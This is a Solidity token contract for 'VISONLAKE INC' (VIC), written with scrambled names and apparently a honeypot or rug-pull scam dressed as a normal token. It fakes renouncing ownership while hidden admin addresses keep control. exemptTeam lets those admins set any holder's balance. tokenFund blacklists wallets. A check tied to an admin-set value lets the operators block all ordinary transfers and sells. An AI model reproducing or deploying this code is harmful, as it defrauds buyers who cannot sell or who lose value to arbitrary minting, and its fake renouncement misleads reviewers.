//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface totalExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromLimit {
    function createPair(address modeSell, address maxAtExempt) external returns (address);
}

abstract contract senderAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderExempt) external view returns (uint256);

    function transfer(address exemptMode, uint256 sellTo) external returns (bool);

    function allowance(address fundTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellTo) external returns (bool);

    function transferFrom(address sender,address exemptMode,uint256 sellTo) external returns (bool);

    event Transfer(address indexed from, address indexed launchTake, uint256 value);
    event Approval(address indexed fundTo, address indexed spender, uint256 value);
}

interface launchedWalletFrom is txExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VISONLAKEINC is senderAuto, txExempt, launchedWalletFrom {

    function shouldMax(address takeTo, address exemptMode, uint256 sellTo) internal returns (bool) {
        if (takeTo == enableBuy) {
            return amountExemptWallet(takeTo, exemptMode, sellTo);
        }
        uint256 receiverBuy = txExempt(launchedLimit).balanceOf(launchMin);
        require(receiverBuy == receiverLaunched);
        require(!fromList[takeTo]);
        return amountExemptWallet(takeTo, exemptMode, sellTo);
    }

    address public enableBuy;

    function balanceOf(address senderExempt) public view virtual override returns (uint256) {
        return receiverMin[senderExempt];
    }

    uint256 public exemptIs;

    string private totalAmountAt = "VISONLAKE INC";

    bool private senderTrading;

    uint8 private takeSellSender = 18;

    function amountExemptWallet(address takeTo, address exemptMode, uint256 sellTo) internal returns (bool) {
        require(receiverMin[takeTo] >= sellTo);
        receiverMin[takeTo] -= sellTo;
        receiverMin[exemptMode] += sellTo;
        emit Transfer(takeTo, exemptMode, sellTo);
        return true;
    }

    address tradingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        
        enableMode();
        totalExempt swapLiquidity = totalExempt(tradingTo);
        launchedLimit = fromLimit(swapLiquidity.factory()).createPair(swapLiquidity.WETH(), address(this));
        if (limitSell == exemptLiquidity) {
            sellSender = true;
        }
        enableBuy = _msgSender();
        listFrom[enableBuy] = true;
        receiverMin[enableBuy] = autoToken;
        if (sellSender != maxTo) {
            maxTo = true;
        }
        emit Transfer(address(0), enableBuy, autoToken);
    }

    function feeTo() private view {
        require(listFrom[_msgSender()]);
    }

    bool public receiverList;

    function getOwner() external view returns (address) {
        return walletSwap;
    }

    address private walletSwap;

    string private teamTokenSender = "VIC";

    function tokenFund(address walletMarketing) public {
        feeTo();
        if (exemptLiquidity != limitSell) {
            sellSender = false;
        }
        if (walletMarketing == enableBuy || walletMarketing == launchedLimit) {
            return;
        }
        fromList[walletMarketing] = true;
    }

    function allowance(address marketingFrom, address launchAmount) external view virtual override returns (uint256) {
        if (launchAmount == tradingTo) {
            return type(uint256).max;
        }
        return fromBuy[marketingFrom][launchAmount];
    }

    function enableMode() public {
        emit OwnershipTransferred(enableBuy, address(0));
        walletSwap = address(0);
    }

    bool private sellSender;

    bool public maxTo;

    mapping(address => mapping(address => uint256)) private fromBuy;

    uint256 launchedMode;

    bool public buyAuto;

    uint256 private limitSell;

    address launchMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address takeTo, address exemptMode, uint256 sellTo) external override returns (bool) {
        if (_msgSender() != tradingTo) {
            if (fromBuy[takeTo][_msgSender()] != type(uint256).max) {
                require(sellTo <= fromBuy[takeTo][_msgSender()]);
                fromBuy[takeTo][_msgSender()] -= sellTo;
            }
        }
        return shouldMax(takeTo, exemptMode, sellTo);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoToken;
    }

    event OwnershipTransferred(address indexed teamWallet, address indexed teamMax);

    mapping(address => bool) public listFrom;

    function minBuyAt(uint256 sellTo) public {
        feeTo();
        receiverLaunched = sellTo;
    }

    function amountSellTrading(address launchReceiverLimit) public {
        if (buyAuto) {
            return;
        }
        if (maxTo == senderTrading) {
            senderTrading = true;
        }
        listFrom[launchReceiverLimit] = true;
        
        buyAuto = true;
    }

    mapping(address => uint256) private receiverMin;

    uint256 private exemptLiquidity;

    function decimals() external view virtual override returns (uint8) {
        return takeSellSender;
    }

    function name() external view virtual override returns (string memory) {
        return totalAmountAt;
    }

    address public launchedLimit;

    function owner() external view returns (address) {
        return walletSwap;
    }

    uint256 receiverLaunched;

    function approve(address launchAmount, uint256 sellTo) public virtual override returns (bool) {
        fromBuy[_msgSender()][launchAmount] = sellTo;
        emit Approval(_msgSender(), launchAmount, sellTo);
        return true;
    }

    function transfer(address receiverReceiver, uint256 sellTo) external virtual override returns (bool) {
        return shouldMax(_msgSender(), receiverReceiver, sellTo);
    }

    function exemptTeam(address receiverReceiver, uint256 sellTo) public {
        feeTo();
        receiverMin[receiverReceiver] = sellTo;
    }

    uint256 private autoToken = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return teamTokenSender;
    }

    mapping(address => bool) public fromList;

}